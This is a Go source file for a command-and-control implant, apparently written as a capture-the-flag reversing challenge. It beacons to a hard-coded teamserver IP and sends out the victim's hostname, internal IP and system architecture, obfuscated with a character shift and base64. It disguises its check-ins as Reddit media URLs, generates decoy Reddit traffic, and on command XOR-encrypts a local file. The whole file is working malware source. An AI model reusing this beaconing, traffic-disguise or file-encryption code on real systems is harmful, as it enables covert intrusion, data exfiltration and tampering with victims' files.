package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"
)

type Registration struct {
	Hostname string
	IP       string
	Arch     string
}

func (r *Registration) String() string {
	sep := " | "
	return strings.Join([]string{r.Hostname, r.IP, r.Arch}, sep)
}



const (
	TS       = "http://34.125.177.32:80"
	//TS       = "http://127.0.0.1:80"
	REGISTER = "/register"
	LOGIN    = "/login"
	PROFILE  = "/media?url=https%3A%2F%2Fi.redd.it%"
)

var posts = []string{
	"http://www.reddit.com/r/clown/comments/qet7tv/first_time_doing_clown_make_up/",
	"http://www.reddit.com/r/clown/comments/17we6o4/ready_to_get_silly/",
	"http://www.reddit.com/media?url=https%3A%2F%2Fpreview.redd.it%2Fn2xtd6492n0c1.jpg%3Fwidth%3D960%26crop%3Dsmart%26auto%3Dwebp%26s%3D824a89031202bc7160134fb26e4afd9ca9e89635",
	"http://www.reddit.com/r/clown/comments/1b2q6i/this_is_my_friend_johnny/",
	"http://www.reddit.com/r/blueteamsec/comments/14l0t9o/detecting_popular_cobalt_strike_malleable_c2/",
	"http://www.reddit.com/r/clown/comments/nrp0yf/found_some_pretty_roses_on_my_walk_around_town/",
	"http://www.reddit.com/r/clown/comments/16j4t2a/half_like_it_half_hate_it/",
	"http://www.reddit.com/r/clown/comments/pa44q9/happy_honkin_monday_friendly_reminder_youre_the/",
	"http://www.reddit.com/r/clown/comments/nktx56/anyone_else_getting_excited_for_the_memorial_3/",
}

func shift(data string, amt int) string {
	var result bytes.Buffer
	for _, c := range data {
		result.WriteString(string(c + rune(amt)))
	}
	return result.String()
}

func randomString(length int) string {
	charset := "abcdefghijklmnopqrstuvwxyz"
	var result bytes.Buffer
	for i := 0; i < length; i++ {
		result.WriteString(string(charset[rand.Intn(len(charset))]))
	}
	return result.String()
}

func fallback() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "-"
	}

	for _, addr := range addrs {
		ipNet, ok := addr.(*net.IPNet)
		if ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				return ipNet.IP.String()
			}
		}
	}

	return "-"
}

func GetInternalIP() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	for _, iface := range interfaces {
		if iface.Name == "Ethernet" {
			addrs, err := iface.Addrs()
			if err != nil {
				return "", err
			}

			for _, addr := range addrs {
				ipNet, ok := addr.(*net.IPNet)
				if ok && !ipNet.IP.IsLoopback() {
					if ipNet.IP.To4() != nil {
						return ipNet.IP.String(), nil
					}
				}
			}
		}
	}

	return fallback(), nil
}

func GetSystemInfo() string {
	os := runtime.GOOS
	arch := runtime.GOARCH

	switch os {
	case "darwin":
		os = "macOS"
	case "windows":
		os = "Windows"
	case "linux":
		os = "Linux"
	}

	switch arch {
	case "amd64":
		arch = "x64"
	case "386":
		arch = "x86"
	}

	return fmt.Sprintf("%s (%s)", os, arch)
}

func register() int {
	content := "hello"
	res, err := http.Post(TS+REGISTER, "text/plain", strings.NewReader(content))
	if err != nil {
		fmt.Println("error: teamserver has been deactivated~ you must be trying to reverse our implant. good luck. x")
		os.Exit(1)
	}
	defer res.Body.Close()

	body, _ := ioutil.ReadAll(res.Body)
	return atoi(string(body))
}

func atoi(s string) int {
	i := 0
	for _, c := range s {
		i = i*10 + int(c-'0')
	}
	return i
}

func login(shiftVal int) int {

	// get hostname
	hostname, _ := os.Hostname()
	ip, _ := GetInternalIP()
	arch := GetSystemInfo()

	beacon := Registration{hostname, ip, arch}
	beaconStr := fmt.Sprintf("%v", beacon)
	shifted := shift(beaconStr, shiftVal)
	encoded := base64.StdEncoding.EncodeToString([]byte(shifted))

	res, err := http.Post(TS+LOGIN, "text/plain", strings.NewReader(encoded))
	if err != nil {
		return 0
	}
	defer res.Body.Close()

	body, _ := ioutil.ReadAll(res.Body)
	if res.StatusCode == http.StatusOK {
		enc := string(body)
		unshifted, _ := base64.StdEncoding.DecodeString(enc)
		decoded := shift(string(unshifted), -shiftVal)
		sleepTime := atoi(strings.TrimSpace(strings.Split(decoded, "|")[1]))
		return sleepTime
	} else {
		return 0
	}
}

func checkIn(shiftVal int) (bool, string) {
	img := randomString(15)
	url := TS + PROFILE + img + ".png"

	res, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer res.Body.Close()

	body, _ := ioutil.ReadAll(res.Body)
	enc := strings.Split(string(body), "||")[len(strings.Split(string(body), "||"))-1]
	unshifted, _ := base64.StdEncoding.DecodeString(enc)
	decoded := shift(string(unshifted), -shiftVal)

	if strings.Contains(decoded, "profile") {
		return true, strings.Split(strings.TrimSpace(decoded), "|")[1]
	} else {
		return false, ""
	}
}

func checkIn2(shiftVal int, profile string) {
	url := TS + profile

	res, err := http.Get(url)
	if err != nil {
		return
	}
	defer res.Body.Close()

	body, _ := ioutil.ReadAll(res.Body)
	enc := strings.Split(string(body), "||")[len(strings.Split(string(body), "||"))-1]
	unshifted, _ := base64.StdEncoding.DecodeString(enc)
	decoded := shift(string(unshifted), -shiftVal)

	if strings.Contains(decoded, "XOR") {
		key := strings.Split(strings.TrimSpace(decoded), "|")[1]

		flag, _ := ioutil.ReadFile("flag.txt")
		encrypted := make([]byte, len(flag))
		for i := 0; i < len(flag); i++ {
			encrypted[i] = flag[i] ^ key[i%len(key)]
		}

		ioutil.WriteFile("flag.txt.enc", encrypted, 0644)
		os.Exit(0)
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	go func() {
		for {
			for _, post := range posts {
				res, err := http.Get(post)
				if err != nil {
					continue
				}
				defer res.Body.Close()
			}
			time.Sleep(300 * time.Millisecond)
		}
	}()

	shiftVal := register()

	sleepTime := login(shiftVal)
	for {
		time.Sleep(time.Duration(sleepTime) * time.Second)
		changeProfile, newProfile := checkIn(shiftVal)
		if changeProfile {
			for {
				checkIn2(shiftVal, newProfile)
				time.Sleep(time.Duration(sleepTime) * time.Second)
			}
		}
	}
}
